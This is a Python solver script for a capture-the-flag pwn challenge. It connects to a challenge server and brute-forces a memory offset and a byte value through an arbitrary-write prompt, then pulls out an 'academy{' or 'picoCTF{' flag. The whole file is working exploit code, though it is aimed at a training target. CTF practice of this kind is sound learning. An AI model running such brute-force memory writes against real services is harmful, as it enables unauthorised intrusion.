import sys, re, time, socket
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
host, port = open(r"./_z_146url.txt").read().split()
port = int(port)
print("cible:", host, port, flush=True)
BASE_MARK = "random string"


def attempt(offset, value):
    try:
        s = socket.create_connection((host, port), timeout=6)
        s.settimeout(3)
    except Exception:
        return None
    try:
        buf = b""
        while b"Address: " not in buf:
            c = s.recv(4096)
            if not c:
                break
            buf += c
        s.sendall(str(offset).encode() + b"\n")
        t0 = time.time()
        while b"Value: " not in buf and time.time() - t0 < 2:
            try:
                c = s.recv(4096)
                if not c:
                    break
                buf += c
            except socket.timeout:
                break
        s.sendall(bytes([value]))
        out = b""
        t0 = time.time()
        while time.time() - t0 < 2.5:
            try:
                c = s.recv(4096)
                if not c:
                    break
                out += c
            except socket.timeout:
                break
        return out.decode("latin-1", "replace")
    except Exception:
        return None
    finally:
        s.close()


print("=== phase 1 : localiser le slot (valeur 0x00) ===", flush=True)
hits = []
t0 = time.time()
for off in range(-4000, -5601, -8):
    r = attempt(off, 0x00)
    if r is None:
        continue
    if BASE_MARK not in r:
        hits.append((off, r))
        print("  offset %d -> %r" % (off, r[:100].replace("\n", " ")), flush=True)
        if len(hits) >= 6:
            break
print("phase 1 : %d candidats en %.0fs" % (len(hits), time.time() - t0), flush=True)
print("=== phase 2 : valeurs candidates sur le premier hit ===", flush=True)
if hits:
    off = hits[0][0]
    for v in range(0, 256, 16):
        r = attempt(off, v)
        if r is None:
            continue
        ok = "Congrats" in r or "academy{" in r
        print("  off=%d val=0x%02x -> %r %s" % (off, v, r[:80].replace("\n", " "), "OK" if ok else ""), flush=True)
        if ok:
            f = re.search(r"(?:academy|picoCTF)\{[^}]*\}", r)
            print("FLAG:", f.group(0) if f else None)
            break
